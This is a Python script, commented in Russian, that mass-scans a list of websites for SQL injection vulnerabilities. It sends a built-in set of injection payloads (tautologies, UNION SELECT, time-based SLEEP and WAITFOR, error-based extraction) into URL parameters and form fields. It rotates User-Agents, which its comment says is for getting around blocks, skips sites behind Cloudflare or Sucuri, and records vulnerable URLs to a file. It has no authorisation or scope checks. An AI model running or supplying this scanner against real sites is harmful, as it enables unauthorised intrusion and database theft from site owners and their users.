import aiohttp
import asyncio
import random
import time
from urllib.parse import urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from tqdm import tqdm

# Читаем список URL
with open("sites.txt", "r") as file:
    urls = [line.strip() for line in file if line.strip()]

# SQL-инъекционные пейлоады
sql_payloads = [
    "'", "\"", "' OR '1'='1' --", "\" OR \"1\"=\"1\" --", "' OR 1=1 --", 
    "' UNION SELECT 1,2,3 --", "' AND SLEEP(5) --", "' AND 1=CONVERT(int, SLEEP(5)) --", 
    "'; WAITFOR DELAY '0:0:5' --", "' OR 1 GROUP BY CONCAT(0x7e,user(),0x7e,FLOOR(RAND(0)*2)) HAVING COUNT(*)>1 --"
]

# User-Agents для обхода блокировок
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
]

async def detect_waf(session, url):
    """Определение WAF (Cloudflare, ModSecurity и т. д.)"""
    try:
        async with session.get(url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=5) as response:
            headers = response.headers
            if "server" in headers and ("cloudflare" in headers["server"].lower() or "sucuri" in headers["server"].lower()):
                print(f"\033[93m[⚠] WAF обнаружен на {url}\033[0m")
                return True
    except:
        pass
    return False

async def check_sql_injection(session, base_url, param, original_value, progress_bar):
    """Тестирование SQL-инъекций"""
    for payload in sql_payloads:
        test_url = f"{base_url}?{urlencode({param: original_value + payload})}"
        progress_bar.set_description(f"\033[94m[🔍] Тест: {param} -> {payload[:10]}...\033[0m")

        try:
            start_time = time.time()
            async with session.get(test_url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=10) as response:
                text = await response.text()
                response_time = time.time() - start_time

                # Проверяем ошибки SQL
                if any(error in text.lower() for error in ["sql syntax", "mysql_fetch", "odbc", "sqlstate", "error in your sql"]):
                    print(f"\033[91m[🔥] SQL-инъекция найдена! {test_url}\033[0m")
                    with open("vulnerable_sites.txt", "a") as vuln_file:
                        vuln_file.write(test_url + "\n")
                    return

                # Проверяем Time-Based инъекции
                if response_time > 4:
                    print(f"\033[95m[⏳] Время ответа подозрительное: {test_url}\033[0m")
                    with open("vulnerable_sites.txt", "a") as vuln_file:
                        vuln_file.write(test_url + "\n")
                    return
        except:
            pass

async def scan_site(session, url, progress_bar):
    """Сканирование одного сайта"""
    if await detect_waf(session, url):
        print(f"\033[91m[⛔] Пропущен {url} (WAF обнаружен)\033[0m")
        return

    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    if not params:
        print(f"\033[93m[⚠] {url} - нет URL-параметров, ищем формы...\033[0m")
        try:
            async with session.get(url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=10) as response:
                text = await response.text()
                soup = BeautifulSoup(text, "html.parser")

                # Поиск форм
                forms = soup.find_all("form")
                for form in forms:
                    inputs = form.find_all("input")
                    for inp in inputs:
                        if inp.get("name"):
                            param_name = inp.get("name")
                            print(f"\033[96m[🔍] Найден скрытый параметр: {param_name}\033[0m")
                            await check_sql_injection(session, url, param_name, "1", progress_bar)
        except:
            pass
        return

    print(f"\033[92m[🔍] Проверяем {url} ({len(params)} параметров)...\033[0m")
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    tasks = [check_sql_injection(session, base_url, param, values[0], progress_bar) for param, values in params.items()]
    await asyncio.gather(*tasks)

async def main():
    with tqdm(total=len(urls), desc="\033[92m[🚀] Сканирование сайтов...\033[0m", unit=" сайт") as progress_bar:
        async with aiohttp.ClientSession() as session:
            tasks = [scan_site(session, url, progress_bar) for url in urls]
            await asyncio.gather(*tasks)
            progress_bar.update(len(urls))

# Запуск
asyncio.run(main())
